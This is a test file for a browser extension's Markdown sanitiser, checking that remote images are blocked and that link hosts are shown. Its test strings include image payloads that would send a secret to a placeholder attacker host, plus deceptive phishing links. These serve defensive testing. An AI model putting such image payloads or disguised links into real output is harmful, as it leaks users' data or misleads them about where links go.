import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import { describe, expect, it } from "vitest";
import {
	isInlineImageAllowed,
	safeMarkdownComponents,
	safeUrlTransform,
} from "../../src/popup/markdownSafety";

const render = (markdown: string): string =>
	renderToStaticMarkup(
		<ReactMarkdown
			urlTransform={safeUrlTransform}
			components={safeMarkdownComponents}
		>
			{markdown}
		</ReactMarkdown>,
	);

const imgSources = (html: string): Array<string> =>
	[...html.matchAll(/<img[^>]*src="([^"]*)"/g)].map((match) => match[1]);

describe("inline image policy", () => {
	const origin = "chrome-extension://abcdefghijklmnop";

	it("allows only images that already live inside the extension", () => {
		expect(isInlineImageAllowed("/images/holder.png", origin)).toBe(true);
		expect(isInlineImageAllowed(`${origin}/icons/a.png`, origin)).toBe(
			true,
		);
		expect(isInlineImageAllowed(`blob:${origin}/1234-5678`, origin)).toBe(
			true,
		);
		expect(isInlineImageAllowed("data:image/png;base64,AAAA", origin)).toBe(
			true,
		);
	});

	it("refuses remote, foreign-extension, protocol-relative and SVG data images", () => {
		expect(isInlineImageAllowed("https://evil.example/x.png", origin)).toBe(
			false,
		);
		expect(isInlineImageAllowed("http://evil.example/x.png", origin)).toBe(
			false,
		);
		expect(
			isInlineImageAllowed(
				"chrome-extension://otherextension/x.png",
				origin,
			),
		).toBe(false);
		expect(isInlineImageAllowed("//evil.example/x.png", origin)).toBe(
			false,
		);
		expect(
			isInlineImageAllowed("data:image/svg+xml;base64,AAAA", origin),
		).toBe(false);
		expect(
			isInlineImageAllowed("blob:https://evil.example/1", origin),
		).toBe(false);
	});
});

describe("Markdown rendering", () => {
	it.each([
		["inline", "![x](https://evil.example/?d=SECRET)"],
		["titled", '![x](https://evil.example/?d=SECRET "title")'],
		["nested alt", "![a [b] c](https://evil.example/?d=SECRET)"],
		["reference", "![x][r]\n\n[r]: https://evil.example/?d=SECRET"],
	])("never loads a remote image (%s)", (_name, markdown) => {
		const html = render(markdown);
		expect(imgSources(html)).toEqual([]);
		expect(html).toContain('href="https://evil.example/?d=SECRET"');
		expect(html).toContain("(evil.example)");
	});

	it("still renders the extension's own images", () => {
		expect(imgSources(render("![p](/images/holder.png)"))).toEqual([
			"/images/holder.png",
		]);
	});

	it("opens links in a new tab and shows where they go", () => {
		const html = render("[click here](https://evil.example/path)");
		expect(html).toContain('target="_blank"');
		expect(html).toContain('rel="noopener noreferrer"');
		expect(html).toContain("(evil.example)");
	});

	it.each([
		[
			"a query naming another host",
			"[https://bank.example/login?from=evil.example](https://evil.example/phish)",
		],
		[
			"a short host inside a word",
			"[Check your tax.com account](https://x.co/a)",
		],
		[
			"userinfo before the real host",
			"[https://bank.example@evil.example](https://evil.example/)",
		],
	])(
		"shows the host when the text only mentions it (%s)",
		(_name, markdown) => {
			const host = new URL(
				markdown.slice(markdown.lastIndexOf("(") + 1, -1),
			).host;
			expect(render(markdown)).toContain(`(${host})`);
		},
	);

	it.each([
		["the host", "[evil.example](https://evil.example/path)"],
		[
			"a URL on the host",
			"[https://evil.example/a](https://evil.example/b)",
		],
		["an autolink", "<https://evil.example/path>"],
	])("leaves out the host when the text already is %s", (_name, markdown) => {
		expect(render(markdown)).not.toContain("(evil.example)");
	});
});
